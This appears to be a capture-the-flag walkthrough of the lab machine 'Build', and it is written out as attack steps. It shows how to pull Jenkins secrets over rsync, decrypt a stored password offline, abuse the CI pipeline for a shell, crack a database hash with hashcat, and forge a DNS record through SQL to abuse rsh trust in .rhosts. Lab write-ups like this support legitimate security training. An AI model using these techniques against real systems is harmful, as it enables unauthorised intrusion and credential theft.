# Build (Easy)

## port scan

```
PORT     STATE    SERVICE         REASON       VERSION
22/tcp   open     ssh             syn-ack      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   closed   domain          conn-refused
512/tcp  open     exec            syn-ack      netkit-rsh rexecd
513/tcp  open     login?          syn-ack
514/tcp  open     shell           syn-ack      Netkit rshd
873/tcp  open     rsync           syn-ack      (protocol version 31)
3000/tcp open     ppp?            syn-ack
3306/tcp filtered mysql           no-response
8081/tcp filtered blackice-icecap no-response
1
```

## services enumeration

gitea server

![](<build(easy)/walkthrough_20240513154206049.png>)

there have a Jenkinsfile which means there have maybe have 'CI/CD'?

## Rlogin Abuse

https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin

## Rsync Discover

we found a backups folder

![](<build(easy)/walkthrough_20240513155705596.png>)

download it on our machine

![](<build(easy)/walkthrough_20240513162254013.png>)

it seems a jenkins config folder

![](<build(easy)/walkthrough_20240513162434472.png>)

![](<build(easy)/walkthrough_20240513162635856.png>)

i will use https://github.com/gquere/pwn_jenkins offline decrypt buildadm cred

```bash
python3 ~/tool/script/jenkins_offline_decrypt.py ./secrets/master.key ./secrets/hudson.util.Secret ./jobs/build/config.xml
```

![](<build(easy)/walkthrough_20240513165407333.png>)

so we offline decrypt buildadm encrypted password `Git1234!`

now we are in gitea with buildadm user

![](<build(easy)/walkthrough_20240513165545244.png>)

## Abuse CI/CD

since we are buildadm , we can modify Jenkinsfile and push it into gitea repo

![](<build(easy)/walkthrough_20240513170725363.png>)

shell

![](<build(easy)/walkthrough_20240513170732840.png>)

we are in docker env

![](<build(easy)/walkthrough_20240513170811151.png>)

![](<build(easy)/walkthrough_20240513170915436.png>)

as we know, there have two fillter port

powerDNS

![](<build(easy)/walkthrough_20240513171715362.png>)

MariaDB with anonymous access

![](<build(easy)/walkthrough_20240513171917130.png>)

there have a db called `powerdnsadmin`

![](<build(easy)/walkthrough_20240513172202437.png>)

we can select user table and get admin hash

![](<build(easy)/walkthrough_20240513172214894.png>)

```bash
sudo hashcat  -m 3200  ./hash /usr/share/wordlists/rockyou.txt
```

`admin:winston`
![](<build(easy)/walkthrough_20240513172253714.png>)

## Abuse rsh-server

since we found ~/.rhosts on docker machine and we have DNS db access

```
admin.build.vl +
intern.build.vl +
```

the `.rhosts` file have `admin.build.vl` and `intern.build.vl` which mean if we on those two hosts, we can rlogin into docker machine

so, what if the `10.10.66.105 have same .rhosts`, let's try add fake dns record, so that "admin.build.vl" is our machine

```sql
INSERT INTO powerdnsadmin.records (domain_id, name, type, content, ttl, prio, disabled, ordername, auth) VALUES (1, 'admin.build.vl', 'A', '10.8.1.167', 60, 0, 0, NULL, 1);
```

![](<build(easy)/walkthrough_20240513174910469.png>)

Done!

![](<build(easy)/walkthrough_20240513174949374.png>)
